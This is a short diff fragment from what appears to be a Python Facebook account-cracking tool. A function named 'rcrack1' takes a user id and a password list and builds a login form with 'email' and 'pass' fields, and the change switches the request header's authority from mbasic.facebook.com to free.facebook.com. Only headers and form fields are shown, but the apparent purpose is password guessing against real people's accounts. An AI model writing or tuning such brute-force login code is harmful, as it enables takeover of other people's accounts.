@@ -210,7 +210,7 @@ def rcrack1(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'mbasic.facebook.com',
+            header_freefb = {'authority': 'free.facebook.com',
             'method': 'GET',
             'scheme': 'https',
             'path': '/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',
